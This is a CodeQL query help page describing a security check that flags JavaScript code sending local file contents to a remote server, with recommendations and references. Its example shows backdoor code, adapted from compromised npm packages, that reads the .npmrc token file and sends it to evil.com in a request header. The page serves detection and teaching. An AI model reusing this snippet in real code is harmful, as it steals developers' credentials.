# File data in outbound network request

```
ID: js/file-access-to-http
Kind: path-problem
Severity: warning
Precision: medium
Tags: security external/cwe/cwe-200

```
[Click to see the query in the CodeQL repository](https://github.com/github/codeql/tree/main/javascript/ql/src/Security/CWE-200/FileAccessToHttp.ql)

Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


## Recommendation
Examine the highlighted code closely to ensure that it is behaving as intended.


## Example
The following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.


```javascript
var fs = require("fs"),
    https = require("https");

var content = fs.readFileSync(".npmrc", "utf8");
https.get({
  hostname: "evil.com",
  path: "/upload",
  method: "GET",
  headers: { Referer: content }
}, () => { });

```

## References
* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).
* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).